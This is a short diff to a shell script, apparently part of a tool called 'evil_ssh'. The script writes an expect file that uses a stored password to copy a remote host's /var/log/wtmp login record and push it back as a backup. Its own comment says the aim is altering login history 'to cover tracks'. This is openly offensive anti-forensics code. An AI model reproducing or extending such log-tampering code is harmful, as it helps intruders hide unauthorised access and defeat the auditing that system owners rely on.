@@ -53,17 +53,15 @@ echo "#!/usr/bin/expect" > $expectFile #write shebang to file
 if [ "$alterLastHistory" == "yes" ]; then #if want to alter last history to cover tracks of logging in, write this to file
 	/bin/cat <<SCP >> $expectFile
 spawn scp -P $port $firstArg:/var/log/wtmp ./evil_ssh_wtmp_backup
-expect {
--re ".*Are.*.*yes.*no.*" {
-send "yes\n"
-exp_continue
-}
+expect yes/no { send yes\r; exp_continue}
 expect "*assword*"
 send "$pass\r"
+expect "100%"
 sleep 1
 spawn scp -P $port ./evil_ssh_wtmp_backup $firstArg:/var/log/wtmp.bak
 expect "*assword*"
 send "$pass\r"
+expect "100%"
 sleep 1
 SCP
 fi
